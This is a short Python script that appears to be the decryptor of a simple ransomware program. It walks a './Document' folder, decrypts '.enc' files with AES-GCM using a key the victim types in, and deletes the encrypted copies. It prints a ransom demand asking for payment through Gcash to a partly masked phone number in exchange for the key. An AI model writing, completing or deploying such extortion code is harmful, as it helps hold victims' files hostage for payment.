import os
import os.path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def decrypt_file(key, in_filename, out_filename=None, chunk_size=64*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    with open(in_filename, 'rb') as infile:
        encrypted = infile.read()
        nonce = encrypted[:16]
        ciphertext = encrypted[16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
    with open(out_filename, 'wb') as outfile:
        outfile.write(decrypted)

def main():
    print("Please send me Gcash - 09*******67 and I will send you the key :)")
    key = input("Key: ").encode('utf-8')

    try:
        # Looping through target files
        for root, dirs, files in os.walk('./Document'):
            for file in files:
                path = os.path.join(root, file)
                # Decrypt the file
                if path.endswith(".enc"):
                    print("Decrypting " + path + "...")
                    decrypt_file(key, path)
                    os.remove(path) # delete the encrypted file
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
